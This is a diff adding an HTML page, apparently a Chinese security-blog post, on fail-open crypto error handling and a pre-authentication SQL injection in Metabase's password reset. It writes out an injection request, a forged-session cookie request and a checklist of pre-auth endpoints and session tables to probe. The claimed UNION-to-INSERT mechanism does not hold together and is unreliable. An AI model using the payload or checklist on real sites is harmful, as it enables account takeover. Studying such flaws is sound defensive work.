@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>密码学 Fail-Open 降级 + SQLi 会话表注入：当「出错路径」比「正常路径」更危险 — DARKSEC</title>
+<meta name="description" content="openssl_encrypt 20+CVE 密码学失败静默降级 + Metabase 密码重置 SQLi→core_session 伪造 admin 会话——揭示「异常路径」才是安全的真正盲区">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 失败路径安全</div>
+        <h1>密码学 Fail-Open 降级 + SQLi 会话表注入：当「出错路径」比「正常路径」更危险 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-17</span>
+          <span>⏱ 12 min read</span>
+          <span>🏷 密码学 / SQL注入 / Fail-Open / 会话伪造</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：异常路径才是真正的攻击面</a></li>
+            <li><a href="#crypto">openssl_encrypt 20+ CVE — 密码学 Fail-Open 降级</a></li>
+            <li><a href="#sqli">Metabase SQLi→会话表注入 — 铸造管理员会话</a></li>
+            <li><a href="#methodology">共性方法论：失败路径枚举法</a></li>
+            <li><a href="#practice">实战清单</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：异常路径才是真正的攻击面 ⚡</h2>
+        <p>安全审计中，我们习惯性地关注「正常流程」——认证怎么做、授权怎么查、输入怎么校验。但今天的两个漏洞揭示了一个被系统性忽视的真相：</p>
+        <blockquote>
+          <p>攻击者不走正门。他们专门找「出错时会发生什么」——解密失败时、密码重置时、token 无效时。异常路径没有被认真设计，只有被随意填充的 fallback。</p>
+        </blockquote>
+        <p>第一个漏洞：<strong>密码学库在解密/解封装失败时静默降级到不安全模式</strong>，20+ CVE 同一模式。第二个漏洞：<strong>预认证的密码重置端点存在 SQLi，直接向会话表注入伪造 admin 会话</strong>。两者都是「异常路径」上的 Fail-Open 设计缺陷。</p>
+
+        <h2 id="crypto">🔐 openssl_encrypt 20+ CVE — 密码学 Fail-Open 降级</h2>
+
+        <h3>背景</h3>
+        <p>2026 年 8 月，NVD 集中披露了 <code>openssl_encrypt</code>（Python 密钥管理/PQC 库）的 20+ CVE（CVE-2026-74900/74901/74875/74894 等）。这不是 20 个不同的 bug——而是<strong>同一种设计错误在每个密码学操作中的重复出现</strong>。</p>
+
+        <h3>核心模式</h3>
+        <p>这个库的几乎每一条 <code>except:</code> 分支都在做同一件错事：<strong>把「操作失败」当成「切换到更弱模式」的触发器</strong>，而非「终止」。</p>
+
+        <pre><code># 模式1: KEM 解封装失败 → 仿真模式
+try:
+    shared_secret = kem.decapsulate(ciphertext)
+except DecapsulationError:
+    # ❌ Fail-Open: 回退到 16 字节确定性派生
+    shared_secret = derive_simulation_key(16)
+
+# 模式2: AES-GCM 解密失败 → 无认证 AES-CTR
+try:
+    plaintext = aes_gcm_decrypt(key, nonce, ciphertext, tag)
+except InvalidTag:
+    # ❌ Fail-Open: 丢弃认证，用 CTR 模式继续
+    plaintext = aes_ctr_decrypt(key, nonce, ciphertext)
+
+# 模式3: 可选依赖缺失 → 校验静默跳过
+if jsonschema_available:
+    validate(data, schema)
+# ❌ jsonschema 没装 = 没校验，不是报错
+
+# 模式4: Token 验证 → 接受任意非空 Bearer
+def verify_api_token(token):
+    if not token:
+        raise AuthError
+    # ❌ 只检查非空，不验证签名
+    return True</code></pre>
+
+        <h3>为什么这是系统性问题</h3>
+        <p>密码学代码唯一正确的失败处理是 <code>raise</code> 终止。但现实中，开发者面对 <code>except</code> 块时的直觉是「不能让程序崩溃」——于是他们加了 fallback，而 fallback 恰好绕过了安全保证。</p>
+
+        <p>更隐蔽的是<strong>「可选依赖→校验变 no-op」</strong>模式：<code>if jsonschema_available: validate()</code> 看起来优雅地处理了依赖缺失，但实际含义是「没装库 = 没校验 = 一切通过」。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 定位所有密码学异常/fallback 分支
+grep -rn "except\|fallback\|simulation\|degraded\|downgrade" src/
+
+# 检查可选依赖控制的安全逻辑
+grep -rn "if.*available\|if.*installed\|try.*import" src/ | grep -i "valid\|check\|verify\|auth"
+
+# 验证解密失败是否 raise
+# 构造无效密文/tag → 观察是抛异常还是静默返回</code></pre>
+
+        <h3>迁移目标</h3>
+        <ul>
+          <li><strong>PQC/后量子密码库</strong>：Kyber/ML-KEM 的 decapsulate 失败路径——这是新蓝海，实现质量远逊于经典密码</li>
+          <li><strong>AEAD 用法</strong>：AES-GCM tag 验证失败后是否用明文继续</li>
+          <li><strong>协议协商降级</strong>：TLS→弱 cipher、SMB→NTLMv1</li>
+          <li><strong>JWT/证书验证</strong>：verify 失败→继续处理（而非拒绝）</li>
+        </ul>
+
+        <h2 id="sqli">💉 Metabase SQLi→会话表注入 — 铸造管理员会话</h2>
+
+        <h3>背景</h3>
+        <p>CVE-2026-72898（CVSS 10.0，CISA KEV 在野利用）：Metabase 的 <code>/reset_password</code> 端点存在预认证 SQL 注入，攻击者不仅能 dump 数据，还能<strong>直接向 <code>core_session</code> 表 INSERT 伪造的 admin session</strong>。</p>
+
+        <h3>攻击链还原</h3>
+        <pre><code># Step 1: 预认证端点——密码重置按设计不需要登录
+POST /api/session/reset_password
+Content-Type: application/json
+
+{
+  "token": "' UNION SELECT 'fake-session-id','admin',1,'2026-12-31'--",
+  "password": "anything"
+}
+
+# Step 2: SQLi 写原语 → 向 core_session 表注入
+# 注入的 SQL 被拼接为 INSERT，创建了一个 admin 的有效 session
+
+# Step 3: 使用伪造 session 访问管理接口
+GET /api/user/current
+Cookie: Metabase.SESSION=fake-session-id
+# → 返回 admin 用户信息，完全接管</code></pre>
+
+        <h3>为什么预认证端点是 SQLi 富矿</h3>
+        <p>密码重置、注册、邮箱激活、token 验证——这些端点<strong>按设计就不需要认证</strong>，却<strong>必然要查数据库</strong>（验证 token、查找用户、检查邮箱）。它们比登录端点更少被安全团队关注，却是 SQLi 的天然高发区。</p>
+
+        <h3>SQLi 写原语 = 最短路提权</h3>
+        <p>当 session/API key 存储在数据库中时，一个可写的 SQLi（INSERT/UPDATE）就是<strong>铸造任意用户会话的能力</strong>。不需要暴力破解密码、不需要 OS 权限提升——直接在 DB 层面成为 admin。</p>
+
+        <blockquote>
+          <p>🔑 规则：session 存 DB 时，可写 SQLi = 铸造任意用户会话 = 最短路提权。</p>
+        </blockquote>
+
+        <h3>预认证端点清单（SRC 实战）</h3>
+        <pre><code># 枚举所有「不需要登录但查 DB」的端点
+# 逐一测单引号、时间盲注
+
+# 常见预认证端点：
+POST /api/session/reset_password    # 密码重置
+POST /api/user                      # 注册
+GET  /api/session/properties        # 配置泄露
+POST /api/session                   # 登录
+GET  /api/setup/check               # 安装检查
+GET  /api/health                    # 健康检查
+GET  /api/token/verify              # Token 验证
+POST /api/util/email/test           # 邮件测试
+GET  /api/public/*                  # 公开页面
+
+# 重点关注 session 表名（决定能否写会话）：
+# core_session (Metabase)
+# django_session (Django)
+# sessions (Express/Sequelize)
+# php_sessions (PHP)
+# cf_sessions (Cloudflare Workers)</code></pre>
+
+        <h2 id="methodology">🧠 共性方法论：失败路径枚举法</h2>
+
+        <p>两个漏洞的深层共性是<strong>「异常路径未经安全设计」</strong>。这催生了一个可复用的审计方法论：</p>
+
+        <h3>1. 失败路径枚举</h3>
+        <p>对系统中每个安全关键操作，列出所有可能的失败场景，确认每个失败路径是 <strong>fail-closed</strong>（拒绝/终止）还是 <strong>fail-open</strong>（降级/跳过/返回成功）：</p>
+        <pre><code># 失败路径枚举清单
+┌─────────────────────────┬──────────────────────────┬──────────┐
+│ 操作                     │ 失败场景                  │ 应该是    │
+├─────────────────────────┼──────────────────────────┼──────────┤
+│ KEM decapsulate         │ 密文无效                  │ raise ❌  │
+│ AES-GCM decrypt         │ tag 不匹配               │ raise ❌  │
+│ JSON Schema validate    │ 依赖未安装               │ raise ❌  │
+│ Token verify            │ 签名无效                  │ reject ❌ │
+│ 密码重置 token 验证      │ token 不存在/过期         │ reject ❌ │
+│ 会话查找                │ session_id 不存在          │ reject ❌ │
+└─────────────────────────┴──────────────────────────┴──────────┘
+
+# 任何「降级」「跳过」「返回成功」= 漏洞</code></pre>
+
+        <h3>2. 预认证攻击面枚举</h3>
+        <p>系统化地枚举所有不需要认证的端点，按「是否查 DB」分类，优先测试查 DB 的端点：</p>
+        <pre><code># 预认证端点分类
+├── 不查 DB（低风险）
+│   ├── /health, /version, /metrics
+│   └── 静态资源
+├── 查 DB 且只读（中风险 — SQLi 目标）
+│   ├── /reset_password, /verify_email
+│   └── /api/token/verify, /api/setup/check
+└── 查 DB 且可写（高风险 — SQLi + 写原语）
+    ├── /register, /activate
+    └── 任何 UPDATE/INSERT 路径</code></pre>
+
+        <h2 id="practice">🎯 实战建议</h2>
+
+        <h3>立即可做</h3>
+        <ol>
+          <li><strong>审计任意 PQC/密钥管理库的失败路径</strong>：<code>grep -rn "except\|fallback\|simulation"</code> 定位所有异常分支，验证 decrypt/decapsulate 失败时是否 raise</li>
+          <li><strong>对 SRC 目标建立「预认证端点清单」</strong>：枚举所有无需登录的端点，逐一测单引号/时间盲注，重点找 session 表名以评估「写会话」可行性</li>
+        </ol>
+
+        <h3>长期积累</h3>
+        <ul>
+          <li>建立「能力等价 API 清单」：对每个危险能力（文件读/写、命令执行、反射、序列化）枚举语言生态内的全部等价入口</li>
+          <li>建立「失败路径枚举」习惯：每次审计新系统时，先扫一遍 <code>except</code>/<code>fallback</code>/<code>downgrade</code> 分支</li>
+        </ul>
+
+        <div class="article-tags">
+          <span class="tag pink">密码学Fail-Open</span>
+          <span class="tag cyan">SQL注入</span>
+          <span class="tag green">会话伪造</span>
+          <span class="tag">失败路径审计</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>~ 感谢阅读 nya~ 🐱✨</p>
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
